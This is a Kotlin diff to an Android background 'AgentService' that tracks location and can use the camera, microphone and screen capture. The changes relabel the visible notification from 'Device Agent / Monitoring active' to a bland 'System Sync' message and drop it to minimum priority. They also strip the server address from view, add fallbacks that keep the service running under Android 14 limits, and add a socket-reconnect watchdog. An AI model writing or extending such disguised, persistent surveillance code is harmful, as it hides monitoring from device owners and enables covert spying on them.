@@ -54,6 +54,13 @@ class AgentService : LifecycleService() {
         // 1. Mandatory for Android 14+: Call startForeground immediately.
         startForegroundServiceWithNotification("Initializing...")
 
+        // Support for dynamic foreground type updates (e.g. when screen capture permission is granted)
+        if (intent?.getBooleanExtra("refresh_foreground", false) == true) {
+            Log.d(TAG, "Refreshing foreground service with updated types")
+            startForegroundServiceWithNotification(this.deviceId)
+            return START_STICKY
+        }
+
         val devId = intent?.getStringExtra("device_id") ?: prefs.getString(AgentConfig.KEY_DEVICE_ID, "") ?: ""
         if (devId.isEmpty()) {
             Log.e(TAG, "Device not configured — stopping service")
@@ -82,7 +89,7 @@ class AgentService : LifecycleService() {
     private fun startForegroundServiceWithNotification(content: String) {
         val channelId = "agent_service_channel"
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(channelId, "Agent Service", NotificationManager.IMPORTANCE_LOW)
+            val channel = NotificationChannel(channelId, "System Service", NotificationManager.IMPORTANCE_MIN)
             val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
             manager.createNotificationChannel(channel)
         }
@@ -94,17 +101,14 @@ class AgentService : LifecycleService() {
         )
 
         val notification = NotificationCompat.Builder(this, channelId)
-            .setContentTitle("Device Agent Active")
-            .setContentText("Monitoring: $content")
+            .setContentTitle("System Sync")
+            .setContentText("Service is running in background")
             .setSmallIcon(android.R.drawable.ic_menu_info_details)
             .setContentIntent(pendingIntent)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
             .build()
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-            // Android 14+: Only include types that don't require an active user session token at startup.
-            // mediaProjection MUST NOT be included unless the service is started from an activity 
-            // that just received the projection token.
             var type = ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or 
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or 
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
@@ -113,7 +117,27 @@ class AgentService : LifecycleService() {
                 type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
             }
             
-            startForeground(NOTIFICATION_ID, notification, type)
+            try {
+                startForeground(NOTIFICATION_ID, notification, type)
+            } catch (e: Exception) {
+                Log.w(TAG, "Failed to start foreground with all types (likely Android 14 background restriction): ${e.message}")
+                // Fallback: Start with only LOCATION type (which is usually allowed from background)
+                try {
+                    startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
+                    Log.i(TAG, "Fallback: Started foreground service with LOCATION type only")
+                } catch (fallbackEx: Exception) {
+                    Log.w(TAG, "Fallback to LOCATION failed: ${fallbackEx.message}")
+                    // Ultimate Fallback: Try DATA_SYNC (least restrictive for background tasks)
+                    try {
+                        startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
+                        Log.i(TAG, "Ultimate Fallback: Started foreground service with DATA_SYNC type")
+                    } catch (finalEx: Exception) {
+                        Log.e(TAG, "All foreground start attempts failed: ${finalEx.message}")
+                        // Prevent the app from crashing by stopping the service gracefully
+                        stopSelf()
+                    }
+                }
+            }
         } else {
             startForeground(NOTIFICATION_ID, notification)
         }
@@ -180,6 +204,17 @@ class AgentService : LifecycleService() {
 
                 Log.d(TAG, "Next location in ${interval / 60000}min (battery: $battery%)")
                 delay(interval)
+            }
+        }
+
+        // Connection Watchdog
+        scope.launch {
+            while (isActive) {
+                delay(30_000) // Check every 30s
+                if (!SocketManager.isConnected()) {
+                    Log.w(TAG, "Watchdog: Socket disconnected — attempting reconnection...")
+                    SocketManager.reconnect()
+                }
             }
         }
     }
@@ -275,10 +310,10 @@ class AgentService : LifecycleService() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 channelId,
-                "Device Agent",
-                NotificationManager.IMPORTANCE_LOW
+                "System Sync",
+                NotificationManager.IMPORTANCE_MIN
             ).apply {
-                description = "Device monitoring is active"
+                description = "Background synchronization service"
             }
             manager.createNotificationChannel(channel)
         }
@@ -290,11 +325,12 @@ class AgentService : LifecycleService() {
         )
 
         return NotificationCompat.Builder(this, channelId)
-            .setContentTitle("Device Agent")
-            .setContentText("Monitoring active · $serverUrl")
+            .setContentTitle("System Sync")
+            .setContentText("Background service active")
             .setSmallIcon(android.R.drawable.ic_menu_compass)
             .setContentIntent(pendingIntent)
             .setOngoing(true)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
             .build()
     }
 
